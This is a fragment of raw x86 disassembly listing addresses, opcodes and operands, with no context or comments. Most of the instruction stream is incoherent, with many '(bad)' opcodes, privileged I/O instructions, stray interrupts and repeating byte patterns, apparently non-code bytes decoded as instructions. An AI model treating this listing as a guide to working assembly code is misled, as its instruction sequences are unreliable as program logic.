  426394:	mov    esi,0xc93b4229
  426399:	cmp    ebx,edx
  42639b:	shl    edx,cl
  42639d:	sub    BYTE PTR [ebx-0x2e],dl
  4263a0:	in     al,dx
  4263a1:	outs   dx,BYTE PTR ds:[esi]
  4263a2:	iret   
  4263a3:	aam    0x76
  4263a5:	mov    al,0xb8
  4263a7:	int    0x4e
  4263a9:	das    
  4263aa:	mov    ebx,0xcbbb2f18
  4263af:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263b2:	sti    
  4263b3:	and    DWORD PTR ds:0xf3e38080,esi
  4263b9:	shl    edx,cl
  4263bb:	das    
  4263bc:	push   ebx
  4263bd:	adc    ecx,DWORD PTR [ecx]
  4263bf:	int3   
  4263c0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263c6:	lea    esi,[ebp+0x2fbd96cd]
  4263cc:	inc    ebp
  4263cd:	jecxz  0x426361
  4263cf:	shl    ebx,cl
  4263d1:	xchg   edx,eax
  4263d2:	int    0x96
  4263d4:	mov    ch,0xcd
  4263d6:	(bad)  
  4263d7:	mov    ebp,0xf73bf03b
  4263dc:	push   ebx
  4263dd:	psrlq  mm5,mm2
  4263e0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263e6:	(bad)  
  4263e7:	popa   
  4263e8:	int    0x76
  4263ea:	in     eax,dx
  4263eb:	int    0x8d
  4263ed:	adc    DWORD PTR [edi],ebp
  4263ef:	inc    ebp
  4263f0:	jge    0x426384
  4263f2:	shr    ebx,cl
  4263f4:	xchg   edx,eax
  4263f5:	int    0x8d
  4263f7:	in     eax,dx
  4263f8:	int    0x96
  4263fa:	adc    DWORD PTR [ebx],edi
  4263fc:	leave  
  4263fd:	cmp    ebx,edx
  4263ff:	shl    edx,cl
  426401:	sub    BYTE PTR [ebx-0x2e],dl
  426404:	in     al,dx
  426405:	outs   dx,BYTE PTR ds:[esi]
  426406:	iret   
  426407:	aam    0x76
  426409:	add    DWORD PTR [eax-0x44d0b133],edi
  42640f:	sbb    BYTE PTR [edi],ch
  426411:	mov    ebx,0x120c3bcb
  426416:	sti    
  426417:	and    DWORD PTR ds:0xf3e38080,esi
  42641d:	shl    edx,cl
  42641f:	das    
  426420:	push   ebx
  426421:	adc    ecx,DWORD PTR [ecx]
  426423:	int3   
  426424:	test   esp,ecx
  426426:	inc    DWORD PTR [eax]
  426428:	add    ch,cl
  42642a:	lea    esi,[ebp+0x2fbd96cd]
  426430:	inc    ebp
  426431:	jecxz  0x4263c5
  426433:	shl    ebx,cl
  426435:	xchg   edx,eax
  426436:	int    0x96
  426438:	mov    ch,0xcd
  42643a:	(bad)  
  42643b:	mov    ebp,0xf73bf03b
  426440:	push   ebx
  426441:	psrlq  mm5,mm2
  426444:	sub    BYTE PTR [edi-0x7406fb2d],al
  42644a:	(bad)  
  42644b:	popa   
  42644c:	int    0x76
  42644e:	in     eax,dx
  42644f:	int    0x8d
  426451:	adc    DWORD PTR [edi],ebp
  426453:	inc    ebp
  426454:	jge    0x4263e8
  426456:	shr    ebx,cl
  426458:	xchg   edx,eax
  426459:	int    0x8d
  42645b:	in     eax,dx
  42645c:	int    0x96
  42645e:	adc    DWORD PTR [ebx],edi
  426460:	leave  
  426461:	cmp    ebx,edx
  426463:	shl    edx,cl
  426465:	sub    BYTE PTR [ebx-0x2e],dl
  426468:	in     al,dx
  426469:	je     0x42643a
  42646b:	push   ebp
  42646c:	jbe    0x4264da
  42646e:	add    BYTE PTR [eax],al
  426470:	add    BYTE PTR [eax-0x44d0b133],bh
  426476:	sbb    BYTE PTR [edi],ch
  426478:	mov    ebx,0x120c3bcb
  42647d:	sti    
  42647e:	and    DWORD PTR ds:0xf3e38080,esi
  426484:	shl    edx,cl
  426486:	das    
  426487:	push   ebx
  426488:	adc    ecx,DWORD PTR [ecx]
  42648a:	int3   
  42648b:	test   DWORD PTR ds:0xcd0000ff,eax
  426491:	lea    esi,[ebp+0x2fbd96cd]
  426497:	inc    ebp
  426498:	jecxz  0x42642c
  42649a:	shl    ebx,cl
  42649c:	xchg   edx,eax
  42649d:	int    0x96
  42649f:	mov    ch,0xcd
  4264a1:	(bad)  
  4264a2:	mov    ebp,0xf73bf03b
  4264a7:	push   ebx
  4264a8:	psrlq  mm5,mm2
  4264ab:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264b1:	(bad)  
  4264b2:	mov    ebx,0xffb506cf
  4264b7:	add    BYTE PTR [eax],al
  4264b9:	or     dh,BYTE PTR [esi-0x7]
  4264bc:	int    0x76
  4264be:	stc    
  4264bf:	pop    edi
  4264c0:	inc    esi
  4264c1:	pop    esp
  4264c2:	inc    ebp
  4264c3:	xchg   edi,eax
  4264c4:	or     cl,BYTE PTR [eax+0x79245161]
  4264ca:	daa    
  4264cb:	or     dh,BYTE PTR [eax-0x7c]
  4264ce:	int    0x6
  4264d0:	mov    ch,0xff
  4264d2:	add    BYTE PTR [eax],al
  4264d4:	int    0x57
  4264d6:	mov    ebp,0xa0000ff
  4264db:	(bad)  
  4264dc:	mov    ebp,0x8621d169
  4264e1:	xor    eax,0x62fd343
  4264e6:	pusha  
  4264e7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264f1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264f8:	mov    eax,0xfff9060a
  4264fd:	add    BYTE PTR [eax],al
  4264ff:	int    0xc5
  426501:	mov    eax,0xff03060a
  426506:	add    BYTE PTR [eax],al
  426508:	pop    ebp
  426509:	es xor eax,0xab88080
  42650f:	push   es
  426510:	std    
  426511:	inc    DWORD PTR [eax]
  426513:	add    BYTE PTR [ebp-0x5d],bl
  426516:	xor    eax,0xab88080
  42651b:	push   es
  42651c:	(bad)  
  42651d:	inc    DWORD PTR [eax]
  42651f:	add    BYTE PTR [ebp+0x1e],bl
  426522:	xor    eax,0xab88080
  426527:	push   es
  426528:	add    BYTE PTR [eax],0x0
  42652b:	add    BYTE PTR [ebp*2-0x47823218],al
  426532:	or     cl,bh
  426534:	xchg   edx,eax
  426535:	add    BYTE PTR [eax],al
  426537:	add    ch,cl
  426539:	jbe    0x42656b
  42653b:	pop    edi
  42653c:	dec    ebx
  42653d:	xor    eax,0xab88080
  426542:	iret   
  426543:	test   BYTE PTR [eax],al
  426545:	add    BYTE PTR [eax],al
  426547:	add    al,0xd3
  426549:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42654f:	add    BYTE PTR [eax],al
  426551:	pop    edi
  426552:	push   esi
  426553:	xor    eax,0xab88080
  426558:	iret   
  426559:	mov    BYTE PTR [eax],al
  42655b:	add    BYTE PTR [eax],al
  42655d:	add    al,0xd3
  42655f:	pushf  
  426560:	mov    eax,0x4acf0a
  426565:	add    BYTE PTR [eax],al
  426567:	int    0xc
  426569:	mov    eax,0x4ccf0a
  42656e:	add    BYTE PTR [eax],al
  426570:	pop    edi
  426571:	add    al,0x35
  426573:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42657a:	add    BYTE PTR [eax],al
  42657c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42657f:	adc    DWORD PTR [eax-0x80],edx
  426582:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426589:	add    bl,dl
  42658b:	mov    ebp,0x151a5f92
  426590:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426597:	add    BYTE PTR [eax],al
  426599:	pop    edi
  42659a:	call   0xcf0a:0xb88080eb
  4265a1:	adc    al,0x0
  4265a3:	add    BYTE PTR [eax],al
  4265a5:	int    0x8d
  4265a7:	xor    BYTE PTR [edx+eax*1],al
  4265aa:	call   ebx
  4265ac:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265b0:	or     al,BYTE PTR [esi]
  4265b2:	adc    eax,0xcd0000ff
  4265b7:	jbe    0x426605
  4265b9:	int    0x8d
  4265bb:	dec    esp
  4265bc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265bf:	mov    ebp,0xff020492
  4265c4:	shl    edx,cl
  4265c6:	sub    BYTE PTR [ebx-0x2d],dl
  4265c9:	leave  
  4265ca:	add    eax,0xff1d06
  4265cf:	add    BYTE PTR [eax],al
  4265d1:	add    BYTE PTR [eax+0x1506cf80],al
  4265d7:	inc    DWORD PTR [eax]
  4265d9:	add    BYTE PTR [eax-0x33],dh
  4265dc:	jbe    0x42660e
  4265de:	int    0x8d
  4265e0:	xor    BYTE PTR [ebx],bh
  4265e2:	jns    0x4265b7
  4265e4:	mov    ebp,0xff020492
  4265e9:	shl    edx,cl
  4265eb:	sub    BYTE PTR [ebx-0x2d],dl
  4265ee:	jo     0x4265bf
  4265f0:	push   es
  4265f1:	stc    
  4265f2:	inc    DWORD PTR [eax]
  4265f4:	add    BYTE PTR [eax-0x33],dh
  4265f7:	jbe    0x4265ee
  4265f9:	int    0x1
  4265fb:	cmp    eax,0xc9808081
  426600:	push   es
  426601:	sbb    BYTE PTR [eax],al
  426603:	add    BYTE PTR [eax],al
  426605:	inc    eax
  426606:	retf   
  426607:	fwait
  426608:	xor    eax,0x76cd5000
  42660d:	adc    al,0x0
  42660f:	icebp  
  426610:	or     dh,BYTE PTR [esi-0x7]
  426613:	int    0x76
  426615:	stc    
  426616:	push   es
  426617:	ins    DWORD PTR es:[edi],dx
  426618:	aam    0x4a
  42661a:	adc    dl,BYTE PTR [esi+0x68]
  42661d:	or     BYTE PTR [ebx+ecx*1],bl
  426620:	fmul   QWORD PTR [ebx-0x17]
  426623:	(bad)  
  426624:	int    0x8d
  426626:	dec    esp
  426627:	int    0x96
  426629:	dec    esp
  42662a:	sar    bh,0x3b
  42662d:	setl   BYTE PTR [ebx]
  426630:	icebp  
  426631:	shr    edx,cl
  426633:	sub    bl,dl
  426635:	jmp    0x4265c9
  426637:	push   ebx
  426638:	adc    ecx,ebp
  42663a:	xchg   esi,eax
  42663b:	cmc    
  42663c:	int    0xa2
  42663e:	and    eax,0x5e808081
  426643:	dec    edx
  426644:	das    
  426645:	push   es
  426646:	popa   
  426647:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42664d:	int    0x96
  42664f:	dec    esp
  426650:	cmp    ecx,DWORD PTR [edi]
  426652:	shr    ebx,cl
  426654:	xchg   edx,eax
  426655:	cmp    esi,ecx
  426657:	shr    edx,cl
  426659:	sub    BYTE PTR [ebx+0x13],dl
  42665c:	int    0x96
  42665e:	cmc    
  42665f:	int    0xa2
  426661:	in     al,0x81
  426663:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42666a:	int    0x96
  42666c:	dec    esp
  42666d:	cmp    ecx,DWORD PTR [edi]
  42666f:	shr    ebx,cl
  426671:	xchg   edx,eax
  426672:	cmp    esi,ecx
  426674:	shr    edx,cl
  426676:	sub    BYTE PTR [ebx+0x13],dl
  426679:	int    0x96
  42667b:	cmc    
  42667c:	int    0xa2
  42667e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426684:	pop    edi
  426685:	xor    ax,0x8080
  426689:	mov    eax,0x24cf0a
  42668e:	add    BYTE PTR [eax],al
  426690:	int    0xc
  426692:	mov    eax,0x28cf0a
  426697:	add    BYTE PTR [eax],al
  426699:	pop    edi
  42669a:	es xor eax,0xab88080
  4266a0:	iret   
  4266a1:	sub    al,0x0
  4266a3:	add    BYTE PTR [eax],al
  4266a5:	pop    edi
  4266a6:	daa    
  4266a7:	xor    eax,0xab88080
  4266ac:	iret   
  4266ad:	xor    al,BYTE PTR [eax]
  4266af:	add    BYTE PTR [eax],al
  4266b1:	add    al,0xd3
  4266b3:	test   eax,0x34cf0ab8
  4266b8:	add    BYTE PTR [eax],al
  4266ba:	add    BYTE PTR [edi-0x69],bl
  4266bd:	xor    eax,0xab88080
  4266c2:	iret   
  4266c3:	cmp    BYTE PTR [eax],al
  4266c5:	add    BYTE PTR [eax],al
  4266c7:	add    al,0xd3
  4266c9:	mov    dl,0xb8
  4266cb:	or     cl,bh
  4266cd:	cmp    al,0x0
  4266cf:	add    BYTE PTR [eax],al
  4266d1:	pop    edi
  4266d2:	fwait
  4266d3:	xor    eax,0xab88080
  4266d8:	iret   
  4266d9:	inc    eax
  4266da:	add    BYTE PTR [eax],al
  4266dc:	add    ch,cl
  4266de:	or     al,0xb8
  4266e0:	or     cl,bh
  4266e2:	inc    esp
  4266e3:	add    BYTE PTR [eax],al
  4266e5:	add    BYTE PTR [edi+0x17],bl
  4266e8:	xor    eax,0xab88080
  4266ed:	iret   
  4266ee:	dec    eax
  4266ef:	add    BYTE PTR [eax],al
  4266f1:	add    BYTE PTR [edi+0x26],bl
  4266f4:	pop    esi
  4266f5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266fc:	add    BYTE PTR [eax],al
  4266fe:	pop    edi
  4266ff:	cmp    esi,DWORD PTR [edx]
  426701:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426708:	add    BYTE PTR [eax],al
  42670a:	jns    0x426782
  42670c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42670d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42670e:	pop    edi
  42670f:	pop    esp
  426710:	adc    eax,0xab88080
  426715:	iret   
  426716:	push   esp
  426717:	add    BYTE PTR [eax],al
  426719:	add    BYTE PTR [ebx+edx*8],al
  42671c:	pop    esp
  42671d:	mov    eax,0x58cf0a
  426722:	add    BYTE PTR [eax],al
  426724:	jns    0x42679c
  426726:	fisttp WORD PTR [ecx+0x79]
  426729:	jbe    0x4266d4
  42672b:	inc    ecx
  42672c:	jns    0x4267a4
  42672e:	loope  0x4266d3
  426730:	pop    edi
  426731:	fcom   st(4)
  426733:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42673a:	add    BYTE PTR [eax],al
  42673c:	jns    0x4267b4
  42673e:	lods   eax,DWORD PTR ds:[esi]
  42673f:	push   edi
  426740:	pop    edi
  426741:	jnp    0x426798
  426743:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42674a:	add    BYTE PTR [eax],al
  42674c:	jns    0x4267c4
  42674e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426752:	jmp    0x8080:0x35a15f47
  426759:	mov    eax,0x64cf0a
  42675e:	add    BYTE PTR [eax],al
  426760:	jns    0x4267d8
  426762:	in     eax,0x18
  426764:	int    0x8d
  426766:	xor    ch,cl
  426768:	xchg   esi,eax
  426769:	xor    BYTE PTR [ebx],bh
  42676b:	(bad)  
  42676d:	icebp  
  42676e:	shr    ebx,cl
  426770:	xchg   edx,eax
  426771:	shr    edx,cl
  426773:	sub    BYTE PTR [ebx+0x13],dl
  426776:	in     al,dx
  426777:	xchg   esp,eax
  426778:	int    0x96
  42677a:	xor    ch,cl
  42677c:	out    0x30,al
  42677e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426784:	stc    
  426785:	shr    ecx,cl
  426787:	sub    BYTE PTR [ebx-0x27],dl
  42678a:	xor    edx,DWORD PTR [ebx]
  42678c:	das    
  42678d:	pop    ecx
  42678e:	mov    WORD PTR [ebp-0x5b],cs
  426791:	int    0x96
  426793:	xor    ch,cl
  426795:	out    0x30,al
  426797:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42679d:	stc    
  42679e:	shr    ecx,cl
  4267a0:	sub    BYTE PTR [ebx-0x27],dl
  4267a3:	int    0xe6
  4267a5:	stc    
  4267a6:	add    al,0x2
  4267a8:	adc    DWORD PTR [edx],0xffffffd3
  4267ab:	fwait
  4267ac:	add    BYTE PTR [eax+0x9033380],0x8c
  4267b3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267b5:	int    0x96
  4267b7:	xor    ch,cl
  4267b9:	lea    esi,[eax]
  4267bb:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267c1:	sub    bl,dl
  4267c3:	repz xchg edx,eax
  4267c5:	push   ebx
  4267c6:	jecxz  0x426795
  4267c8:	(bad)  
  4267c9:	stc    
  4267ca:	xchg   DWORD PTR [ebx],edx
  4267cc:	int    0x96
  4267ce:	xor    ch,cl
  4267d0:	out    0x30,al
  4267d2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267d8:	xchg   edx,eax
  4267d9:	shr    ecx,cl
  4267db:	sub    BYTE PTR [ebx-0x27],dl
  4267de:	add    al,0xd2
  4267e0:	mov    BYTE PTR [edx],cl
  4267e2:	(bad)  
  4267e3:	stc    
  4267e4:	inc    ebx
  4267e5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267eb:	int    0x96
  4267ed:	xor    BYTE PTR [ebx],bh
  4267ef:	(bad)  
  4267f1:	icebp  
  4267f2:	shr    ebx,cl
  4267f4:	xchg   edx,eax
  4267f5:	shr    edx,cl
  4267f7:	sub    BYTE PTR [ebx+0x13],dl
  4267fa:	or     cl,bh
  4267fc:	adc    eax,0xcd0000ff
  426801:	lea    ecx,[ebp+ecx*8-0x6a]
  426805:	dec    esp
  426806:	cmp    ecx,DWORD PTR [edi]
  426808:	cmp    esi,ecx
  42680a:	shr    edx,cl
  42680c:	sub    bl,dl
  42680e:	jmp    0x4267a2
  426810:	push   ebx
  426811:	adc    ecx,edi
  426813:	xchg   esi,eax
  426814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426815:	or     dl,BYTE PTR ds:0xff1dcf
  42681b:	add    BYTE PTR [ecx+0x6b],ah
  42681e:	xor    eax,0x13cd8080
  426823:	mov    eax,0x4258d0a
  426828:	rcl    edx,cl
  42682a:	int    0xfa
  42682c:	mov    eax,0xcf29e60a
  426831:	loopne 0x4267dc
  426833:	mov    eax,0x42de60a
  426838:	leave  
  426839:	test   BYTE PTR [eax-0x304d19f6],bh
  42683f:	loopne 0x426855
  426841:	mov    eax,0x435e60a
  426846:	leave  
  426847:	loop   0x426801
  426849:	or     ah,dh
  42684b:	cmp    ebp,ecx
  42684d:	cli    
  42684e:	mov    eax,0xcd3de60a
  426853:	add    edi,DWORD PTR [eax-0x32be19f6]
  426859:	cld    
  42685a:	mov    eax,0xcd45e60a
  42685f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426865:	cli    
  426866:	mov    eax,0xcfc2e60a
  42686b:	loopne 0x426896
  42686d:	mov    eax,0x455e60a
  426872:	leave  
  426873:	test   BYTE PTR [eax-0x30a619f6],bh
  426879:	loopne 0x426810
  42687b:	mov    eax,0x45de60a
  426880:	leave  
  426881:	loop   0x42683b
  426883:	or     ah,dh
  426885:	popa   
  426886:	mov    eax,0xb8658d0a
  42688b:	or     dl,BYTE PTR [esi-0x47f33297]
  426891:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426897:	int    0x96
  426899:	dec    esp
  42689a:	cmp    esi,ecx
  42689c:	cmp    ecx,DWORD PTR [edi]
  42689e:	shr    edx,cl
  4268a0:	sub    bl,dl
  4268a2:	jmp    0x426836
  4268a4:	push   ebx
  4268a5:	adc    ecx,ebp
  4268a7:	xchg   esi,eax
  4268a8:	dec    esp
  4268a9:	int    0xe6
  4268ab:	dec    esp
  4268ac:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268b2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268b8:	jmp    0x301bbbe5
  4268bd:	mov    ebx,0xb8d93b5e
  4268c2:	or     dh,BYTE PTR [ecx]
  4268c4:	int    0x8d
  4268c6:	dec    esp
  4268c7:	int    0x96
  4268c9:	dec    esp
  4268ca:	cmp    ecx,DWORD PTR [edi]
  4268cc:	cmp    esi,ecx
  4268ce:	shr    ebx,cl
  4268d0:	xchg   edx,eax
  4268d1:	shr    edx,cl
  4268d3:	sub    BYTE PTR [ebx+0x13],dl
  4268d6:	int    0x96
  4268d8:	dec    esp
  4268d9:	iret   
  4268da:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268e0:	out    0x4c,al
  4268e2:	shl    ebx,cl
  4268e4:	xchg   edx,eax
  4268e5:	cmp    edi,ecx
  4268e7:	shr    ecx,cl
  4268e9:	sub    BYTE PTR [ebx-0x27],dl
  4268ec:	das    
  4268ed:	mov    ebx,0xb8d93b5e
  4268f2:	or     dh,BYTE PTR [ecx]
  4268f4:	int    0x8d
  4268f6:	dec    esp
  4268f7:	int    0x96
  4268f9:	dec    esp
  4268fa:	cmp    esi,ecx
  4268fc:	shr    edx,cl
  4268fe:	sub    BYTE PTR [ebx],bh
  426900:	psrlq  mm5,mm3
  426903:	xchg   edx,eax
  426904:	push   ebx
  426905:	adc    ecx,ebp
  426907:	xchg   esi,eax
  426908:	dec    esp
  426909:	int    0xe6
  42690b:	dec    esp
  42690c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426912:	stc    
  426913:	shr    ecx,cl
  426915:	sub    BYTE PTR [ebx-0x27],dl
  426918:	mov    eax,0x9096cc0a
  42691d:	inc    DWORD PTR [eax]
  42691f:	add    ch,cl
  426921:	lea    ecx,[ebp+ecx*8-0x6a]
  426925:	dec    esp
  426926:	cmp    esi,ecx
  426928:	shr    edx,cl
  42692a:	sub    BYTE PTR [ebx],bh
  42692c:	psrlq  mm5,mm3
  42692f:	xchg   edx,eax
  426930:	push   ebx
  426931:	adc    ecx,ebp
  426933:	xchg   esi,eax
  426934:	dec    esp
  426935:	int    0xe6
  426937:	dec    esp
  426938:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42693e:	stc    
  42693f:	shr    ecx,cl
  426941:	sub    BYTE PTR [ebx-0x27],dl
  426944:	mov    eax,0xa496cc0a
  426949:	inc    DWORD PTR [eax]
  42694b:	add    ch,cl
  42694d:	lea    esi,[eax]
  42694f:	int    0x96
  426951:	xor    BYTE PTR [ebx],bh
  426953:	icebp  
  426954:	cmp    ecx,DWORD PTR [edi]
  426956:	shr    edx,cl
  426958:	sub    bl,dl
  42695a:	jmp    0x4268ee
  42695c:	push   ebx
  42695d:	adc    ecx,ebp
  42695f:	xchg   esi,eax
  426960:	xor    ch,cl
  426962:	out    0x30,al
  426964:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42696a:	xchg   edx,eax
  42696b:	shr    ecx,cl
  42696d:	sub    BYTE PTR [ebx-0x27],dl
  426970:	xchg   DWORD PTR [ebx],edx
  426972:	or     cl,bh
  426974:	adc    eax,0xcd0000ff
  426979:	lea    ecx,[ebp+ecx*8-0x6a]
  42697d:	dec    esp
  42697e:	int    0xe6
  426980:	mov    BYTE PTR [ebx],bh
  426982:	icebp  
  426983:	cmp    ecx,DWORD PTR [edi]
  426985:	shr    ebx,cl
  426987:	xchg   edx,eax
  426988:	shr    edx,cl
  42698a:	sub    BYTE PTR [ebx+0x13],dl
  42698d:	iret   
  42698e:	push   es
  42698f:	nop
  426990:	inc    DWORD PTR [eax]
  426992:	add    BYTE PTR [edx],cl
  426994:	add    eax,0xff1dcf
  426999:	add    bh,cl
  42699b:	jbe    0x42696d
  42699d:	mov    ebp,0x10d8
  4269a2:	int    0x8d
  4269a4:	xor    ch,cl
  4269a6:	xchg   esi,eax
  4269a7:	xor    al,al
  4269a9:	(bad)  
  4269aa:	cmp    ecx,DWORD PTR [edi]
  4269ac:	stos   BYTE PTR es:[edi],al
  4269ad:	cmp    ebx,ecx
  4269af:	shr    ebx,cl
  4269b1:	xchg   edx,eax
  4269b2:	shr    edx,cl
  4269b4:	sub    BYTE PTR [ebx+0x13],dl
  4269b7:	or     al,BYTE PTR ds:0xff1dcf
  4269bd:	add    ch,cl
  4269bf:	jbe    0x426a0d
  4269c1:	int    0x8d
  4269c3:	dec    esp
  4269c4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269c7:	mov    ebp,0xd3f03b92
  4269cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269d0:	aam    0x3c
  4269d2:	iret   
  4269d3:	push   es
  4269d4:	adc    eax,0x700000ff
  4269d9:	int    0x76
  4269db:	xor    ch,cl
  4269dd:	lea    esi,[eax]
  4269df:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269e2:	mov    ebp,0xd3f03b92
  4269e7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269eb:	jo     0x4269bc
  4269ed:	push   es
  4269ee:	and    al,0x0
  4269f0:	add    BYTE PTR [eax],al
  4269f2:	jo     0x4269c1
  4269f4:	jbe    0x426a0a
  4269f6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269fd:	int    0x8d
  4269ff:	dec    esp
  426a00:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a03:	lock int 0xe6
  426a06:	mov    bl,dl
  426a08:	mov    ebp,0x28f2d392
  426a0d:	push   ebx
  426a0e:	ror    edi,cl
  426a10:	iret   
  426a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a12:	inc    DWORD PTR [eax]
  426a14:	add    BYTE PTR [edx],cl
  426a16:	int3   
  426a17:	push   es
  426a18:	sbb    eax,0xcf0000ff
  426a1d:	jbe    0x426a44
  426a1f:	mov    ebp,0xeff5
  426a24:	int    0x8d
  426a26:	xor    ch,cl
  426a28:	xchg   esi,eax
  426a29:	xor    BYTE PTR [ebx],bh
  426a2b:	psrlq  mm5,mm3
  426a2e:	xchg   edx,eax
  426a2f:	add    al,0xfb
  426a31:	call   ebx
  426a33:	jmp    0xcf05:0xa135328
  426a3a:	sbb    eax,0x610000ff
  426a3f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a45:	xor    eax,0xab88080
  426a4a:	push   es
  426a4b:	jo     0x426a4d
  426a4d:	add    BYTE PTR [eax],al
  426a4f:	iret   
  426a50:	mov    dh,BYTE PTR [eax]
  426a52:	mov    eax,0xb4cf0a
  426a57:	add    BYTE PTR [eax],al
  426a59:	pop    ebp
  426a5a:	adc    BYTE PTR ds:0xab88080,dh
  426a60:	push   es
  426a61:	bound  eax,QWORD PTR [eax]
  426a63:	add    BYTE PTR [eax],al
  426a65:	int    0xd2
  426a67:	mov    eax,0x94060a
  426a6c:	add    BYTE PTR [eax],al
  426a6e:	int    0xd3
  426a70:	mov    eax,0x98060a
  426a75:	add    BYTE PTR [eax],al
  426a77:	add    al,0x6d
  426a79:	sub    ch,cl
  426a7b:	jge    0x426a35
  426a7d:	or     cl,bh
  426a7f:	mov    eax,0xcf000000
  426a84:	mov    ch,BYTE PTR [eax]
  426a86:	mov    eax,0xbccf0a
  426a8b:	add    BYTE PTR [eax],al
  426a8d:	add    al,0xd3
  426a8f:	pusha  
  426a90:	mov    eax,0xc0cf0a
  426a95:	add    BYTE PTR [eax],al
  426a97:	iret   
  426a98:	mov    cl,BYTE PTR [edx-0x48]
  426a9b:	or     cl,bh
  426a9d:	les    eax,FWORD PTR [eax]
  426a9f:	add    BYTE PTR [eax],al
  426aa1:	int    0xf9
  426aa3:	mov    eax,0x9c670a
  426aa8:	add    BYTE PTR [eax],al
  426aaa:	iret   
  426aab:	loopne 0x426a4d
  426aad:	pop    edi
  426aae:	add    BYTE PTR ds:0xab88080,dh
  426ab4:	iret   
  426ab5:	enter  0x0,0x0
  426ab9:	iret   
  426aba:	mov    bh,bh
  426abc:	mov    eax,0x90cf0a
  426ac1:	add    BYTE PTR [eax],al
  426ac3:	mov    eax,0xa0670a
  426ac8:	add    BYTE PTR [eax],al
  426aca:	add    al,0xc9
  426acc:	stc    
  426acd:	mov    eax,0xa4670a
  426ad2:	add    BYTE PTR [eax],al
  426ad4:	int    0xf9
  426ad6:	pop    edi
  426ad7:	leave  
  426ad8:	xor    eax,0xab88080
  426add:	iret   
  426ade:	add    BYTE PTR [eax],0x0
  426ae1:	add    ch,cl
  426ae3:	jge    0x426a9d
  426ae5:	or     cl,bh
  426ae7:	aam    0x0
  426ae9:	add    BYTE PTR [eax],al
  426aeb:	int    0xc5
  426aed:	mov    eax,0xe0060a
  426af2:	add    BYTE PTR [eax],al
  426af4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426af7:	or     ah,BYTE PTR [edi-0x58]
  426afa:	add    BYTE PTR [eax],al
  426afc:	add    bh,cl
  426afe:	addr16 in al,0x0
  426b01:	add    BYTE PTR [eax],al
  426b03:	leave  
  426b04:	push   es
  426b05:	lods   al,BYTE PTR ds:[esi]
  426b06:	add    BYTE PTR [eax],al
  426b08:	add    dh,ah
  426b0a:	xor    eax,0x6c9352b
  426b0f:	fadd   DWORD PTR [eax]
  426b11:	add    BYTE PTR [eax],al
  426b13:	jae    0x426b4a
  426b15:	jno    0x426b4c
  426b17:	mov    eax,0x3076cdaf
  426b1c:	int    0x8d
  426b1e:	xor    ch,cl
  426b20:	xchg   esi,eax
  426b21:	xor    BYTE PTR [edx+eax*1],al
  426b24:	call   ebx
  426b26:	repnz sub BYTE PTR [ebx],bh
  426b29:	jns    0x426afe
  426b2b:	mov    ebp,0xcdd35392
  426b30:	lea    esi,[eax]
  426b32:	add    al,0x2
  426b34:	(bad)  
  426b35:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b3b:	repz xchg edx,eax
  426b3d:	push   ebx
  426b3e:	jecxz  0x426b7b
  426b40:	retf   
  426b41:	add    al,0xd2
  426b43:	sbb    bl,BYTE PTR [ebx]
  426b45:	retf   
  426b46:	cmp    eax,DWORD PTR [eax]
  426b48:	inc    ebx
  426b49:	cli    
  426b4a:	das    
  426b4b:	or     cl,dl
  426b4d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b54:	das    
  426b55:	add    al,0x37
  426b57:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b5e:	xchg   esi,eax
  426b5f:	xor    BYTE PTR [ebx],bh
  426b61:	psrlq  mm5,mm3
  426b64:	xchg   edx,eax
  426b65:	add    al,0xfb
  426b67:	call   ebx
  426b69:	jmp    0xcd7d:0x87135328
  426b70:	aad    0xb8
  426b72:	cmp    edx,DWORD PTR ds:0x708d
  426b78:	add    ch,cl
  426b7a:	lea    esi,[eax]
  426b7c:	int    0xe6
